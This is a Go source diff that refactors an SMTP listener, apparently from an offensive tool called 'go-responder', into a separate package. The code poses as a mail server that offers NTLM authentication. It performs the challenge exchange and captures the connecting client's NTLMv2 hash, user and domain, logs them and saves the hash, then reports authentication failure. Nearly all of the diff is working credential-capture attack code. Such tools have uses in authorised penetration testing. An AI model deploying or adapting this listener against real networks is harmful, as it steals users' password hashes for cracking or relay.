@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"bufio"
@@ -7,34 +7,36 @@ import (
 	"net"
 	"strings"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-func serveSMTP(ifaceIP net.IP) {
+func ServeSMTP(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:25", ifaceIP))
 	if err != nil {
-		logError("SMTP listen :25 — %v (need root?)", err)
+		core.LogError("SMTP listen :25 — %v (need root?)", err)
 		return
 	}
-	logInfo("SMTP listening on %s:25", ifaceIP)
+	core.LogInfo("SMTP listening on %s:25", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handleSMTP(c)
+		go HandleSMTP(c)
 	}
 }
 
-func handleSMTP(c net.Conn) {
+func HandleSMTP(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(60 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
 	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }
 
-	send("220 " + sessionMachineName + " ESMTP")
+	send("220 " + core.SessionMachineName + " ESMTP")
 
 	for {
 		line, err := r.ReadString('\n')
@@ -46,7 +48,7 @@ func handleSMTP(c net.Conn) {
 
 		switch {
 		case strings.HasPrefix(upper, "EHLO") || strings.HasPrefix(upper, "HELO"):
-			send("250-" + sessionMachineName)
+			send("250-" + core.SessionMachineName)
 			send("250-AUTH NTLM")
 			send("250 AUTH NTLM")
 
@@ -59,7 +61,7 @@ func handleSMTP(c net.Conn) {
 				}
 			}
 			if token == "" {
-				send("334 ") // request token
+				send("334 ")
 				token, err = r.ReadString('\n')
 				if err != nil {
 					return
@@ -72,13 +74,13 @@ func handleSMTP(c net.Conn) {
 				send("535 5.7.8 Authentication failed")
 				return
 			}
-			ntlm := FindNTLMSSP(raw)
-			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
+			ntlm := core.FindNTLMSSP(raw)
+			if len(ntlm) < 12 || core.NTLMMsgType(ntlm) != 1 {
 				send("535 5.7.8 Authentication failed")
 				return
 			}
-			logVerbose("SMTP NTLM Type1 from %s", c.RemoteAddr())
-			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
+			core.LogVerbose("SMTP NTLM Type1 from %s", c.RemoteAddr())
+			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))
 
 			type3Line, err := r.ReadString('\n')
@@ -87,14 +89,14 @@ func handleSMTP(c net.Conn) {
 			}
 			type3Line = strings.TrimRight(type3Line, "\r\n")
 			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
-			ntlm3 := FindNTLMSSP(raw3)
-			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
-				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
+			ntlm3 := core.FindNTLMSSP(raw3)
+			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
+				hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					logSuccess("[SMTP] NTLMv2 captured from %s", c.RemoteAddr())
-					logSuccess("       %s\\%s", domain, user)
-					logSuccess("       %s", hash)
-					saveHash(hash)
+					core.LogSuccess("[SMTP] NTLMv2 captured from %s", c.RemoteAddr())
+					core.LogSuccess("       %s\\%s", domain, user)
+					core.LogSuccess("       %s", hash)
+					core.SaveHash(hash)
 				}
 			}
 			send("535 5.7.8 Authentication credentials invalid")
